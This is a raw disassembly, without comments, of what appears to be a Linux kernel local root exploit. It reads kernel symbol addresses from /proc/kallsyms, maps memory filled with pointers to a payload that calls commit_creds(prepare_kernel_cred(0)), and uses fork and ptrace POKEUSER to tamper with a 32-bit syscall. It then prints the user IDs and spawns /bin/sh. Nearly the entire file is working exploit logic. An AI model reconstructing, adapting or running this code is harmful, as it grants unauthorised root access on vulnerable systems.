xor ebp, ebp
mov r9, rdx
pop rsi
mov rdx, rsp
and rsp, 0xfffffffffffffff0
push rax
push rsp
mov r8, sym.__libc_csu_fini
mov rcx, sym.__libc_csu_init
mov rdi, main
call sym.imp.__libc_start_main
jmp qword [reloc.__libc_start_main]
sub rsp, 8
mov rax, qword [reloc.__gmon_start__]
test rax, rax
je 0x40095e
call rax
add rsp, 8
ret
push rbp
mov rbp, rsp
push rbx
sub rsp, 8
cmp byte [obj.completed.6145], 0
jne 0x4009c6
mov eax, obj.__DTOR_END__
sub rax, obj.__DTOR_LIST__
sar rax, 3
lea rbx, [rax - 1]
mov rax, qword [obj.dtor_idx.6147]
cmp rbx, rax
jbe 0x4009bf
add rax, 1
mov qword [obj.dtor_idx.6147], rax
call qword [rax*8 + obj.__DTOR_LIST__]
mov rax, qword [obj.dtor_idx.6147]
cmp rbx, rax
ja 0x4009a1
mov byte [obj.completed.6145], 1
add rsp, 8
pop rbx
leave
ret
push rbp
cmp qword [obj.__JCR_LIST__], 0
mov rbp, rsp
je 0x4009f4
mov eax, 0
test rax, rax
je 0x4009f4
mov edi, obj.__JCR_LIST__
mov r11, rax
leave
jmp r11
leave
ret
push rbp
mov rbp, rsp
push rbx
mov ebx, obj.__CTOR_LIST__
sub rsp, 8
mov rax, qword [obj.__CTOR_LIST__]
cmp rax, 0xffffffffffffffff
je 0x40110f
nop dword [rax + rax]
sub rbx, 8
call rax
mov rax, qword [rbx]
cmp rax, 0xffffffffffffffff
jne 0x401100
add rsp, 8
pop rbx
leave
ret
push rbp
mov rbp, rsp
push r13
push r12
push rbx
sub rsp, 0x28
mov qword [var_30h], rdi
mov qword [length], rsi
mov edi, str.commit_creds
call sym.get_symbol
mov qword [obj.commit_creds], rax
mov rax, qword [obj.commit_creds]
test rax, rax
jne 0x400cb3
mov edi, str.symbol_table_not_available__aborting_
call sym.imp.puts
mov edi, 1
call sym.imp.exit
mov edi, str.prepare_kernel_cred
call sym.get_symbol
mov qword [obj.prepare_kernel_cred], rax
mov rax, qword [obj.prepare_kernel_cred]
test rax, rax
jne 0x400ce4
mov edi, str.symbol_table_not_available__aborting_
call sym.imp.puts
mov edi, 1
call sym.imp.exit
mov rax, qword [var_30h]
and rax, 0xfffffffffffff000
mov qword [addr], rax
mov rsi, qword [addr]
mov edi, str.mapping_at__lx_n
mov eax, 0
call sym.imp.printf
mov rdi, qword [addr]
mov rsi, qword [length]
mov r9d, 0
mov r8d, 0xffffffff
mov ecx, 0x32
mov edx, 7
call sym.imp.mmap
cmp rax, 0xffffffffffffffff
jne 0x400d56
mov edi, str.mmap_fault
call sym.imp.puts
mov edi, 1
call sym.imp.exit
mov eax, sym.kernelmodecode
mov rdx, rax
mov rax, qword [var_30h]
mov qword [rax], rdx
add qword [var_30h], 8
mov rax, qword [var_30h]
mov rdx, rax
mov rax, qword [length]
add rax, qword [addr]
cmp rdx, rax
jb 0x400d42
mov rax, 0x101
int 0x80
call sym.imp.getegid
mov r12d, eax
call sym.imp.getgid
mov r13d, eax
call sym.imp.geteuid
mov ebx, eax
call sym.imp.getuid
mov esi, eax
mov r8d, r12d
mov ecx, r13d
mov edx, ebx
mov edi, str.UID__d__EUID:_d_GID:_d__EGID:_d_n
mov eax, 0
call sym.imp.printf
mov edx, 0
mov esi, str.bin_sh
mov edi, str._bin_sh
mov eax, 0
call sym.imp.execl
mov edi, str.no__bin_sh___
call sym.imp.puts
mov edi, 0
call sym.imp.exit
push rbp
mov rbp, rsp
sub rsp, 0x260
mov qword [var_238h], rdi
mov dword [var_10h], 0
mov dword [var_ch], 0
mov esi, 0x401138
mov edi, str._proc_kallsyms
call sym.imp.fopen
mov qword [stream], rax
cmp qword [stream], 0
jne 0x400c46
mov esi, 0x401138
mov edi, str._proc_ksyms
call sym.imp.fopen
mov qword [stream], rax
cmp qword [stream], 0
jne 0x400a97
mov qword [var_240h], 0
jmp 0x400c64
mov dword [var_ch], 1
jmp 0x400c46
cmp dword [var_ch], 0
jne 0x400ad6
lea rdx, [var_20h]
lea rax, [s2]
lea rcx, [var_21h]
mov rdi, qword [stream]
mov r8, rax
mov esi, str._p__c__s_n
mov eax, 0
call sym.imp.fscanf
mov dword [var_10h], eax
jmp 0x400bda
lea rdx, [var_20h]
lea rcx, [s2]
mov rdi, qword [stream]
mov esi, str._p__s_n
mov eax, 0
call sym.imp.fscanf
mov dword [var_10h], eax
cmp dword [var_10h], 2
jne 0x400bda
lea rdi, [s2]
mov esi, 0x401166
call sym.imp.strstr
test rax, rax
jne 0x400c46
lea rdi, [s2]
mov esi, 0x40116a
call sym.imp.strstr
test rax, rax
jne 0x400c46
lea rdi, [s2]
mov esi, 0x5f
call sym.imp.strrchr
mov qword [var_8h], rax
lea rax, [s2]
add rax, 5
cmp rax, qword [var_8h]
jae 0x400bda
mov rax, qword [var_8h]
sub rax, 3
mov qword [var_248h], rax
mov qword [var_250h], 0x40116e
mov qword [var_258h], 3
cld
mov rsi, qword [var_248h]
mov rdi, qword [var_250h]
mov rcx, qword [var_258h]
repe cmpsb byte [rsi], byte ptr [rdi]
seta dl
setb al
mov ecx, edx
sub cl, al
mov eax, ecx
movsx eax, al
test eax, eax
jne 0x400bda
sub qword [var_8h], 4
jmp 0x400bb7
sub qword [var_8h], 1
lea rax, [s2]
cmp rax, qword [var_8h]
jae 0x400bd3
mov rax, qword [var_8h]
sub rax, 1
movzx eax, byte [rax]
cmp al, 0x5f
je 0x400bb2
mov rax, qword [var_8h]
mov byte [rax], 0
cmp dword [var_10h], 0
jne 0x400bfc
lea rdx, [s2]
mov rdi, qword [stream]
mov esi, 0x401172
mov eax, 0
call sym.imp.fscanf
jmp 0x400c46
lea rsi, [s2]
mov rdi, qword [var_238h]
call sym.imp.strcmp
test eax, eax
jne 0x400c46
mov rax, qword [var_20h]
mov rdx, rax
mov rsi, qword [var_238h]
mov edi, str.resolved_symbol__s_to__p_n
mov eax, 0
call sym.imp.printf
mov rdi, qword [stream]
call sym.imp.fclose
mov rsi, qword [var_20h]
mov qword [var_240h], rsi
jmp 0x400c64
cmp dword [var_10h], 0xffffffff
jne 0x400aa3
mov rdi, qword [stream]
call sym.imp.fclose
mov qword [var_240h], 0
mov rax, qword [var_240h]
leave
ret
jmp qword [reloc.puts]
jmp qword [reloc.exit]
jmp qword [reloc.printf]
jmp qword [reloc.mmap]
jmp qword [reloc.getegid]
jmp qword [reloc.getgid]
jmp qword [reloc.geteuid]
jmp qword [reloc.getuid]
jmp qword [reloc.execl]
ret
sub rsp, 8
call sym.__do_global_dtors_aux
add rsp, 8
ret
push rbp
mov rbp, rsp
push rbx
sub rsp, 0x18
mov qword [var_10h], rdi
mov qword [var_18h], rsi
mov rbx, qword [obj.commit_creds]
mov rax, qword [obj.prepare_kernel_cred]
mov edi, 0
call rax
mov rdi, rax
call rbx
mov eax, 0xffffffff
add rsp, 0x18
pop rbx
leave
ret
mov qword [rsp - 0x20], r12
mov qword [rsp - 0x18], r13
lea r12, loc.__preinit_array_start
mov qword [rsp - 0x10], r14
mov qword [rsp - 8], r15
mov r14, rsi
mov qword [rsp - 0x30], rbx
mov qword [rsp - 0x28], rbp
sub rsp, 0x38
mov r15d, edi
mov r13, rdx
call sym._init
lea rax, loc.__preinit_array_start
sub r12, rax
sar r12, 3
test r12, r12
je 0x4010b8
xor ebp, ebp
mov rbx, rax
nop
add rbp, 1
mov rdx, r13
mov rsi, r14
mov edi, r15d
call qword [rbx]
add rbx, 8
cmp r12, rbp
jne 0x4010a0
mov rbx, qword [var_8h]
mov rbp, qword [var_10h]
mov r12, qword [var_18h]
mov r13, qword [var_20h]
mov r14, qword [var_28h]
mov r15, qword [var_30h]
add rsp, 0x38
ret
push rbp
mov rbp, rsp
add rsp, 0xffffffffffffff80
mov dword [var_74h], edi
mov qword [var_80h], rsi
mov dword [var_24h], 0
mov qword [var_18h], 0xffffffff80000000
mov qword [var_10h], 0xffffffff84000000
mov dword [data], 0x808
mov dword [var_4h], 0x40
cmp dword [var_74h], 4
jne 0x400e37
mov rdx, qword [var_18h]
mov rax, qword [var_10h]
mov rsi, rax
sub rsi, rdx
mov rax, qword [data]
add rax, qword [var_18h]
mov rdi, rax
call sym.docall
mov edi, 0
call sym.imp.exit
call sym.imp.fork
mov dword [pid], eax
cmp dword [pid], 0
jne 0x400ea5
mov ecx, 0
mov edx, 0
mov esi, 0
mov edi, 0
mov eax, 0
call sym.imp.ptrace
mov rax, qword [var_80h]
mov rsi, qword [rax]
mov rax, qword [var_80h]
mov rdi, qword [rax]
mov r9d, 0
mov r8d, str.432
mov ecx, 0x401238
mov edx, 0x40123a
mov eax, 0
call sym.imp.execl
mov edi, 0x40123c
call sym.imp.perror
mov edi, 1
call sym.imp.exit
cmp dword [pid], 0xffffffff
jne 0x400ebf
mov edi, 0x401247
call sym.imp.puts
mov edi, 1
call sym.imp.exit
lea rax, [wstatus]
mov rdi, rax
call sym.imp.wait
cmp eax, dword [pid]
jne 0x400ebf
mov eax, dword [wstatus]
mov dword [var_60h], 0
mov dword [var_60h], eax
mov eax, dword [var_60h]
and eax, 0x7f
test eax, eax
jne 0x400ef6
mov edi, str.Process_finished
call sym.imp.puts
jmp 0x401037
mov eax, dword [wstatus]
mov dword [var_50h], 0
mov dword [var_50h], eax
mov eax, dword [var_50h]
and eax, 0xff
cmp eax, 0x7f
jne 0x400ebf
mov eax, dword [wstatus]
mov dword [var_40h], 0
mov dword [var_40h], eax
mov eax, dword [var_40h]
and eax, 0xff00
sar eax, 8
cmp eax, 5
je 0x400f5b
mov eax, dword [wstatus]
mov dword [var_30h], 0
mov dword [var_30h], eax
mov eax, dword [var_30h]
and eax, 0xff00
mov esi, eax
sar esi, 8
mov edi, str.Process_received_signal:__d_n
mov eax, 0
call sym.imp.printf
jmp 0x401037
mov esi, dword [pid]
mov ecx, 0
mov edx, 0x78
mov edi, 3
mov eax, 0
call sym.imp.ptrace
mov qword [var_20h], rax
cmp qword [var_20h], 0x101
jne 0x400fc8
mov rax, qword [data]
mov rcx, rax
shr rcx, 3
mov esi, dword [pid]
mov edx, 0x78
mov edi, 6
mov eax, 0
call sym.imp.ptrace
cmp rax, 0xffffffffffffffff
jne 0x400fc1
mov edi, str.PTRACE_POKEUSER_fault
call sym.imp.puts
mov edi, 1
call sym.imp.exit
mov dword [var_24h], 1
cmp qword [var_20h], 0xb
jne 0x400ffd
cmp dword [var_24h], 0
je 0x400ffd
mov esi, dword [pid]
mov ecx, 0
mov edx, 0
mov edi, 0x11
mov eax, 0
call sym.imp.ptrace
mov edi, 0x2710
call sym.imp.sleep
jmp 0x400ff1
mov esi, dword [pid]
mov ecx, 0
mov edx, 1
mov edi, 0x18
mov eax, 0
call sym.imp.ptrace
cmp rax, 0xffffffffffffffff
jne 0x400ebf
mov edi, str.PTRACE_SYSCALL_fault
call sym.imp.puts
mov edi, 1
call sym.imp.exit
mov eax, 0
leave
ret
jmp qword [reloc.fork]
jmp qword [reloc.ptrace]
jmp qword [reloc.perror]
jmp qword [reloc.wait]
jmp qword [reloc.sleep]
sub rsp, 8
call sym.call_gmon_start
call sym.frame_dummy
call sym.__do_global_ctors_aux
add rsp, 8
ret
jmp qword [reloc.fopen]
jmp qword [reloc.strrchr]
jmp qword [reloc.strstr]
jmp qword [reloc.strcmp]
jmp qword [reloc.fclose]
jmp qword [reloc.fscanf]
